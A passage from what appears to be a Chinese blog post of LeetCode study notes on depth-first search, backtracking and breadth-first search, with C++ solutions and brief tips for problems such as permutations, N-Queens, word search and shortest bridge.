class="line">        <span class="keyword">if</span> (canReach[l][c]) <span class="keyword">return</span>;</span><br><span class="line">        canReach[l][c] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x = l + directions[i], y = c + directions[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; heights.<span class="built_in">size</span>() &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; heights[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp; heights[x][y] &gt;= heights[l][c])</span><br><span class="line">                <span class="built_in">flow</span>(heights, canReach, x, y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：关键在于确定起点位置，这道题因为二维数组起点不固定，可以想一想从海上出发，”逆流而上”能到达的点即是可以到达海平面的点。</p></li></ul><h2 id="二、回溯法"><a href="#二、回溯法" class="headerlink" title="二、回溯法"></a>二、回溯法</h2><ul><li><p>算法介绍：回溯法(backtracking)是优先搜索的一种特殊情况，又称为试探法，常用于需要记录节点状态的深度优先搜索。通常来说，排列、组合、选择类问题使用回溯法比较方便。<br>顾名思义，回溯法的核心是回溯。在搜索到某一节点的时候，如果我们发现目前的节点(及其子节点)并不是需求目标时，我们回退到原来的节点继续搜索，并且把在目前节点修改的<strong>状态还原</strong>。</p></li><li><p>补充：</p><ul><li>回溯法修改一般有两种情况，一种是修改<strong>最后一位输出</strong>，比如排列组合；一种是修改<strong>访问标记</strong>，比如矩阵里搜字符串。</li><li>两个小诀窍，<strong>一是按引用传状态，二是所有的状态修改在递归完成后回改</strong>。</li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/permutations">全排列</a><br>给定一个无重复数字的整数数组，求其所有的排列方式。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; permutedNums;</span><br><span class="line">        <span class="built_in">permute</span>(nums, permutedNums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> permutedNums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">permute</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; permutedNums, <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (length == nums.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">            permutedNums.<span class="built_in">push_back</span>(nums);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[length]);</span><br><span class="line">            <span class="built_in">permute</span>(nums, permutedNums, length + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[length]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记得要把swap过的swap回来。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/combinations">组合</a><br>给定一个整数n和一个整数k，求在1到n中选取k个数字的所有组合方法。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combine</span>(<span class="type">int</span> n, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; combinedNums;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        <span class="built_in">combine</span>(combinedNums, nums, n, k, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> combinedNums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">combine</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; combinedNums, vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">            combinedNums.<span class="built_in">push_back</span>(nums);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length; i &lt;= n; ++i) &#123;</span><br><span class="line">            nums.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">combine</span>(combinedNums, nums, n, k, i + <span class="number">1</span>);</span><br><span class="line">            nums.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和全排列本质上差不多。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/word-search">单词搜索</a><br>给定一个字母矩阵，所有的字母都与上下左右四个方向上的字母相连。给定一个字符串，求字符串能不能在字母矩阵中寻找到。<br><img src="https://assets.leetcode.com/uploads/2020/11/04/word2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">exist</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, string word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = board.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">visited</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">dfs</span>(board, word, <span class="number">0</span>, i, j, visited)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">const</span> vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">const</span> string&amp;word, <span class="type">int</span> length, <span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt;&amp;visited)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= board.<span class="built_in">size</span>() || y &lt; <span class="number">0</span> || y &gt;= board[<span class="number">0</span>].<span class="built_in">size</span>() || visited[x][y] || board[x][y] != word[length])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (word.<span class="built_in">length</span>() &lt;= length + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        visited[x][y] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x - <span class="number">1</span>, y, visited) ||</span><br><span class="line">            <span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x + <span class="number">1</span>, y, visited) ||</span><br><span class="line">            <span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x, y - <span class="number">1</span>, visited) ||</span><br><span class="line">            <span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x, y + <span class="number">1</span>, visited))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        visited[x][y] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题是非常典型的修改访问标记。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/n-queens">N皇后</a><br>按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。n皇后问题研究的是如何将n个皇后放置在n×n的棋盘上，并且使皇后彼此之间不能相互攻击。<br>给你一个整数n，返回所有不同的n皇后问题的解决方案。每一种解法包含一个不同的n皇后问题的棋子放置方案，该方案中’Q’和’.’分别代表了皇后和空位。<br><img src="https://assets.leetcode.com/uploads/2020/11/13/queens.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">solveNQueens</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; res;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">board</span><span class="params">(n, string(n, <span class="string">&#x27;.&#x27;</span>))</span></span>;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; chess;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">            <span class="built_in">solve</span>(res, board, n, <span class="number">0</span>, i, chess);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(vector&lt;vector&lt;string&gt;&gt;&amp; solutions, vector&lt;string&gt;&amp; board, <span class="type">int</span> n, <span class="type">int</span> x, <span class="type">int</span> y, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; chess)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (chess.<span class="built_in">size</span>() == n - <span class="number">1</span>) &#123;</span><br><span class="line">            board[x][y] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">            solutions.<span class="built_in">push_back</span>(board);</span><br><span class="line">            board[x][y] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chess.<span class="built_in">push_back</span>(&#123;x, y&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [j, k] : chess) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == k || <span class="built_in">abs</span>(x + <span class="number">1</span> - j) == <span class="built_in">abs</span>(i - k)) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) <span class="keyword">continue</span>;</span><br><span class="line">            board[x][y] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">            <span class="built_in">solve</span>(solutions, board, n, x + <span class="number">1</span>, i, chess);</span><br><span class="line">            board[x][y] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        chess.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：分析一下状态即可，棋盘的字符即是标志位。</p></li></ul><h2 id="三、广度优先搜索"><a href="#三、广度优先搜索" class="headerlink" title="三、广度优先搜索"></a>三、广度优先搜索</h2><ul><li><p>算法解释：广度优先搜索(breadth-ﬁrst search，BFS)不同与深度优先搜索，它是一层层进行遍历的，因此需要用先入先出的队列(queue)而非先入后出的栈(stack)进行遍历。由于是按层次进行遍历，广度优先搜索时按照“广”的方向进行遍历的，也常常用来处理最短路径等问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> /</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>考虑上面这棵简单的树，其广度优先搜索的顺序为1-&gt;2-&gt;3-&gt;4。</p></li><li><p>补充：深度优先搜索和广度优先搜索都可以处理可达性问题，即从一个节点开始是否能达到另一个节点。</p></li><li><p>题目一：<a href="https://leetcode.cn/problems/shortest-path-in-binary-matrix">二进制矩阵中的最短路径</a><br>给定一个二维0-1矩阵，其中1表示障碍，0表示道路，每个位置与周围八个格子相连。求从左上角到右下角的最短到达距离。如果没有可以到达的方法，返回-1。、<br><img src="https://assets.leetcode.com/uploads/2021/02/18/example1_1.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestPathBinaryMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (grid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; location;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>(), depth = <span class="number">0</span>;</span><br><span class="line">        location.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        grid[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (!location.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ++depth;</span><br><span class="line">            <span class="type">int</span> len = location.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (len--) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [i, j] = location.<span class="built_in">front</span>();</span><br><span class="line">                <span class="comment">// cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl;</span></span><br><span class="line">                location.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (i == n - <span class="number">1</span> &amp;&amp; j == n - <span class="number">1</span>) <span class="keyword">return</span> depth;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                    <span class="type">int</span> x = i + direction[k];</span><br><span class="line">                    <span class="type">int</span> y = j + direction[k + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= n || grid[x][y] == <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    location.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">                    grid[x][y] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            len = location.<span class="built_in">size</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记得改变访问状态。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/shortest-bridge">最短的桥</a><br>给你一个大小为nxn的二元矩阵grid ，其中1表示陆地，0表示水域。岛是由四面相连的1形成的一个最大组，即不会与非组内的任何其他1相连。grid中恰好存在两座岛。<br>你可以将任意数量的0变为1，以使两座岛连接起来，变成一座岛 。返回必须翻转的0的最小数目。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; direction = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestBridge</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; location;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> depth = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n &amp;&amp; depth &lt; <span class="number">0</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">findOnePlace</span>(grid, location, i, j, n);</span><br><span class="line">                    ++depth;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!location.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> length = location.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (length--) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [i, j] = location.<span class="built_in">front</span>();</span><br><span class="line">                location.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">                    <span class="type">int</span> x = i + direction[k];</span><br><span class="line">                    <span class="type">int</span> y = j + direction[k + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= n || grid[x][y] == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span> (grid[x][y] == <span class="number">1</span>) <span class="keyword">return</span> depth;</span><br><span class="line">                    grid[x][y] = <span class="number">-1</span>;</span><br><span class="line">                    location.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            length = location.<span class="built_in">size</span>();</span><br><span class="line">            ++depth;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">findOnePlace</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; location, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= n || grid[x][y] != <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        location.<span class="built_in">push</span>(&#123;x, y&#125;);</span><br><span class="line">        grid[x][y] = <span class="number">-1</span>; <span class="comment">// record visited location</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="built_in">findOnePlace</span>(grid, location, x + direction[i], y + direction[i + <span class="number">1</span>], n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：先用深度搜索找到一个岛再找第二个岛。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/word-ladder-ii">单词接龙 II</a><br>按字典wordList完成从单词beginWord到单词endWord转化，一个表示此过程的转换序列是形式上像beginWord-&gt;s1-&gt;s2-&gt;…-&gt;sk这样的单词序列，并满足：</p><ul><li>每对相邻的单词之间仅有单个字母不同。</li><li>转换过程中的每个单词si(1&lt;&#x3D;i&lt;&#x3D;k)必须是字典wordList中的单词。注意，beginWord不必是字典wordList中的单词。</li><li>s_k &#x3D;&#x3D; endWord<br>给你两个单词beginWord和endWord，以及一个字典wordList。请你找出并返回所有从beginWord到endWord的最短转换序列，如果不存在这样的转换序列，返回一个空列表。每个序列都应该以单词列表[beginWord, s1, s2, …, sk]的形式返回。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">findLadders</span>(string beginWord, string endWord, vector&lt;string&gt; &amp;wordList) &#123;</span><br><span class="line">        <span class="type">int</span> length = wordList.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> wordLength = wordList[<span class="number">0</span>].<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; connection;</span><br><span class="line">        vector&lt;string&gt; ladder;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ladders;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(length, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; ladderTrace;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; length; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span 